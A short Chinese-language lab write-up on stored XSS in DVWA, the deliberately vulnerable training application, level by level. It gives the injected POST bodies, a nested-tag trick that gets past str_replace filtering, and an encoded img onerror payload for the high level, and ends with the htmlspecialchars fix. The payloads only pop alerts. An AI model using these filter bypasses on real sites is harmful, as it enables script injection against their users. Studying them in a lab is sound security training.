# DVWA-XSS-Stored 





# low 



post data 
```
txtName=1111111111&mtxMessage=22222222222222222222222222222222222222222222222222&btnSign=Sign+Guestbook
```
- txtName 最多10個字元
- mtxMessage 最多50個字元
- 不過這是前端的長度限制，我們實際上可以修改包。


改成以下，測試兩個欄位，都可以觸發XSS
```
txtName=<script>alert('xss1')</script>&mtxMessage=<script>alert('xss2')</script>&btnSign=Sign+Guestbook
```








# medium 


使用一樣的payload  不行

```
Name: alert('xss1')
Message: alert(\'xss2\')
```


雙寫 xss1 可以 但xss2 不行
```
txtName=<s<script>cript>alert('xss1')</script>&mtxMessage=<s<script>cript>alert('xss2')</script>&btnSign=Sign+Guestbook
```


只剩name 可以繞過。
```
$name = str_replace( '<script>', '', $name ); 
$message = htmlspecialchars( $message ); 
```




# high

上個payload 無效
```
txtName=<s<script>cript>alert('xss1')</script>&mtxMessage=<s<script>cript>alert('xss2')</script>&btnSign=Sign+Guestbook


Name: >
Message: alert(\'xss2\')
```

但可以知道name 還有希望，他把script過慮了。



```

<> 都可以用


//有空格和符號需要encode 
<img src=1 href=1 onerror="alert(1)"></img>

%3Cimg%20src%3D1%20href%3D1%20onerror%3D%22alert%281%29%22%3E%3C%2Fimg%3E

或是使用+號
<img+src=1+href=1+onerror="alert(1)"></img>

```




























# impossible

都加上htmlspecialchars
```
 $message = htmlspecialchars( $message );
 $name = htmlspecialchars( $name ); 
```